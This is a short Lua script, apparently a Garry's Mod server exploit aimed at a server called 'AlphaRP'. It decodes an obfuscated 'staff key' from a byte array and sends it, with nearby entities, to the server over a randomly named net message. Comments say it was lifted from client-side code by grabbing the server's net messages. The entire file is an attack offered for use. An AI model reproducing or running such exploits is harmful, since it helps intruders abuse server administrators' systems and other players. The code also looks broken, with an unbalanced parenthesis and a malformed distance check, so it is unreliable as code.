local encrypted = {88,77,87,87,90,72,75,86,74,81,15,81,79,83,76,80,91,90,83,85,70,82,15,82,67,73,70,79,72,91,90,70,89,83,15,83,78,83,74,87,74,78,72,71,74,81,15,81,77,71,90,69,70,79,92,86,90,92,15,92,84,79,71,88,90,69,83,73,83,72,15,72,85,75,75,73,68,83,72,83,80,76}
local i_dont_fucking_know_what_this_is = ""
for k,v in pairs(encrypted) do
i_dont_fucking_know_what_this_is = i_dont_fucking_know_what_this_is..string.char(v+30)
end

--code stolen from client side
net.Start("sagjiudaibjiosdgjoihsoihjisidh")
--checks for aim target
for k,v in pairs(ents.FindByClass("wd_ab_t") do
if not LocalPlayer():Distance(v:GetPos()) < 25 then return end
 net.WriteEntity(v)
end
 net.WriteBit(14)
 --gets staff key
 net.WriteString(i_dont_fucking_know_what_this_is)
net.SendToServer()
print("fixed by github.com/ANrmlHuman/")
--this was fixed from the patch
--this was found by grabbing all of the nets on AlphaRP
